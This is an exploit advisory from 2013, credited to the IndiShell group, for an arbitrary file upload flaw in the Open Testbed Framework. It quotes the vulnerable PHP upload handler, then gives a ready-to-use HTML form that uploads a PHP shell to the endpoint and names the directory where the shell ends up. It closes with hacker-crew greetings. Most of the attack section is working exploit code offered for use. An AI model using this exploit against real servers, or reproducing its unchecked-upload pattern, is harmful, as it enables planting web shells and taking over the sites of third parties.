                                            
# Exploit Title           : Open TestBed framework arbitrary file upload exploit
# Date                   : 26 November 2013
# Exploit Author         : 3rr0r1046 IndiShell
# Vulnerable script link  : https://github.com/mszczodrak/otf
# Tested on              : Linux
 #Category        : Remote exploit


////////////////////
DESCRIPTION  
////////////////////
The Open Testbed Framework (OTF) consists of a set of tools for rapid deployment of a Low-Power Wireless Network (LPWN) testbeds.
There is flaw in Open TestBed framework script which allows an attacker to upload php shell .

//////////////////
Prof of concept
//////////////////

https://github.com/mszczodrak/otf/blob/master/web/upload_file.php
this is the file which contains vulnerable code . During file upload script does not check for file extension and upload it to server
here is the vulnerable code

<?php
/*
        Author: Marcin Szczodrak
        Columbia University
        Last Modified: 10/22/2012
*/
include("header.php");
file_exists("configuration.php") or die("Missing 'configuration.php' file. Please use 'configuration.php.example' as a template to create 'configuration.php'");
include("configuration.php");
$content = "<pre>";
$content = $content . "\t\tUploading Log<br />";
// Limit file size to 200KB
//$content = $content . "Z1: " . $_FILES["Z1_firmware"]["size"] . " TelosB: " . $_FILES["TelosB_firmware"]["size"];
if (($_FILES["Z1_firmware"]["size"] < $max_firmware_size) and ($_FILES["TelosB_firmware"]["size"] < $max_firmware_size))
  {
  if ($_FILES["Z1_firmware"]["error"] > 0)
    {
    $content = $content . "<b>Z1 firmware file is missing.</b>" . "<br />";
    $content = $content . "<b>Error: " . $_FILES["Z1_firmware"]["error"] . "</b><br />";
    }
  else
    {
    $content = $content . "<b>Z1</b><br />";
    $content = $content . "Upload: " . $_FILES["Z1_firmware"]["name"] . "<br />";
    $content = $content . "Type: " . $_FILES["Z1_firmware"]["type"] . "<br />";
    $content = $content . "Size: " . ($_FILES["Z1_firmware"]["size"] / 1024) . " Kb<br />";
    $content = $content . "Stored in: " . $_FILES["Z1_firmware"]["tmp_name"] . "<br />";
    move_uploaded_file($_FILES["Z1_firmware"]["tmp_name"],
    $Z1_upload . $_FILES["Z1_firmware"]["name"] );
    $content = $content . "Stored in: " . $Z1_upload . $_FILES["Z1_firmware"]["name"] . "<br />";

    $fz = fopen($Z1_nodes, 'w');
    fwrite($fz, $_POST['Z1_nodes']);
    fclose($fz);
    }

	
	
	this code will let you upload any file having size below 200 kb and store it to 127.0.0.1/web/uploads/ 
	if your shell name is shell.php , it will be stored in uploads folder with name   Z1_shell.php
	
	here is exploit code 
	==========================================================================================================================

	
<html>	
	<body >
	<div align=center>
	<font size=4 color=red face="comic sans ms"><img src="http://www.freesmileys.org/smileys/smiley-cool21.gif"> --==[[ code for India,Hack for India,Die for India ]]==-- <img src="http://www.freesmileys.org/smileys/smiley-flag010.gif"></font><br><br>
	
	<form method=post action="http://127.0.0.1/otf-master/web/upload_file.php"  enctype=multipart/form-data>

<br>Browse  shell : <input type=file name="Z1_firmware">
  <input type=submit value="spin the shit">
</form>
</body></html>

============================================================================================================================
	shell will be in directory  
	http://127.0.0.1/otf-master/web/uploads/
	
	
-==[[Greetz to]]==--
###########################################################################################
#Guru ji zero ,code breaker ica, root_devil, google_warrior,INX_r0ot,Darkwolf indishell,Baba ,Silent poison India,Magnum sniper,Atul Dwivedi,ethicalnoob Indishell,
#Local root indishell,Irfninja indishell,Reborn India,L0rd Crus4d3r,cool toad,cool shavik,Hackuin,Alicks,Ebin V Thomas,Dinelson Amine,Th3 D3str0yer,SKSking,Mr. Trojan,
#rad paul,Godzila,mike waals,zoo,cyber warrior,Neo hacker ICA,Suriya Prakash,cyber gladiator,Cyber Ace, Golden boy INDIA,Ketan Singh,Yash,Aneesh Dogra,AR AR
#saad abbasi,hero,Minhal Mehdi ,Raj bhai ji , Hacking queen ,lovetherisk,brown suger and rest of TEAM INDISHELL
--==[[Love to]]==--
# My Father , my Ex Teacher,GCE college ke DON,cold fire hacker,Mannu, ViKi,Ashu bhai ji,Soldier Of God, Bhuppi,Mohit, Ffe ^_^,Ashish,Shardhanand ,Budhaoo
